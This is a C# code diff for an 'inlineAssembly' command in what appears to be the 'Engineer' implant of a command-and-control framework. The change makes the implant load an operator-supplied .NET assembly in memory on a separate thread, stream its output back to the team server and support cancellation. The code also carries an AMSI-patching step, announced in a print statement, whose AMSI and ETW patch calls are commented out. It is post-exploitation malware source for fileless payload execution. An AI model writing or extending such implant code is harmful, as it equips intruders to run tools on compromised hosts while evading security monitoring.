@@ -1,4 +1,5 @@
 ﻿using Engineer.Extra;
+using Engineer.Functions;
 using Engineer.Models;
 using System;
 using System.Collections.Generic;
@@ -7,6 +8,7 @@ using System.Linq;
 using System.Reflection;
 using System.Security;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Engineer.Commands
@@ -16,11 +18,12 @@ namespace Engineer.Commands
         //Goal is to allow the user to use the inline assembly feature to execute .net code in the engineers current process 
         public override string Name => "inlineAssembly";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             if (task.File.Length < 1)
             {
-                return "error: " + "no assembly suppiled use the /file argument, file location should be on team server.";
+                Tasking.FillTaskResults("error: " + "no assembly suppiled use the /file argument, file location should be on team server.",task,EngTaskStatus.FailedWithWarnings);
+                return;
             }
             task.Arguments.TryGetValue("/args", out string assemblyArgument);
             assemblyArgument = assemblyArgument.TrimStart(' ');
@@ -43,30 +46,65 @@ namespace Engineer.Commands
             {
 
                 // check clr version installed on system
-                string installedClr = Environment.Version.ToString();
+                //string installedClr = Environment.Version.ToString();
 
-                
+
                 //moved this outside cause if the patch throws an error it stops the whole execution
                 Console.WriteLine("[+]Patching AMSI");
                 //Patch_AMSI patchObject = new Patch_AMSI();
                 //Console.WriteLine(patchObject.Execute(null));
                 //Patch_ETW patchetwObject = new Patch_ETW();
                 //Console.WriteLine(patchetwObject.Execute(null));
-            
+
                 // debase64 encode assembly string into a byte array
                 byte[] assemblyBytes = task.File;
-                Assembly assembly = Assembly.Load(assemblyBytes);
-                var clrVersion =  assembly.ImageRuntimeVersion;
+               
+                //var clrVersion =  assembly.ImageRuntimeVersion;
 
-                Console.WriteLine($"the clr version needed is {clrVersion} ");
-                Console.WriteLine($"the installed versions is {installedClr}");
+                //Console.WriteLine($"the clr version needed is {clrVersion} ");
+                // Console.WriteLine($"the installed versions is {installedClr}");
 
-                assembly.EntryPoint.Invoke(null, new[] { $"{assemblyArgument}".Split() });
-                writer.Flush();
+                //make a new thread to run the assembly in and as it gets output from the assembly it will be written to the stream writer
+                Thread thread = new Thread(() =>
+                {
+                    //will block so needs its own thread
+                    Assembly assembly = Assembly.Load(assemblyBytes);
+                    assembly.EntryPoint.Invoke(null, new[] { $"{assemblyArgument}".Split() });
+                });
+
+                //start the thread 
+                thread.Start();
+                string output = "";
+                //while the thread is running call Tasking.FillTaskResults to update the task results
+                while (thread.IsAlive)
+                {
+                    //Console.WriteLine("thread is alive");
+                    //Console.WriteLine("filling task results");
+                    output = Encoding.UTF8.GetString(ms.ToArray());
+                    if (output.Length > 0)
+                    {
+                        //clear the memory stream
+                        ms.Clear();
+                        Tasking.FillTaskResults(output, task,EngTaskStatus.Running);
+                        output = "";
+                    }
+                    if (task.cancelToken.IsCancellationRequested)
+                    {
+                        thread.Abort();
+                        Tasking.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled);
+                        return;
+                    }
+                    Thread.Sleep(100);
+                }
+                //finish reading and set status to complete 
+                output = Encoding.UTF8.GetString(ms.ToArray());
+                ms.Clear();
+                Tasking.FillTaskResults(output, task,EngTaskStatus.Complete);
+
             }
             catch (Exception e)
             {
-                Console.WriteLine("error: " + e.Message);
+                Tasking.FillTaskResults("error: " + e.Message, task, EngTaskStatus.Failed);
             }
             finally
             {
@@ -74,8 +112,7 @@ namespace Engineer.Commands
                 Console.SetOut(stdOut);
                 Console.SetError(stdErr);
             }
-            string Output = Encoding.UTF8.GetString(ms.ToArray());
-            return Output;
+            return;
         }
     }
 }
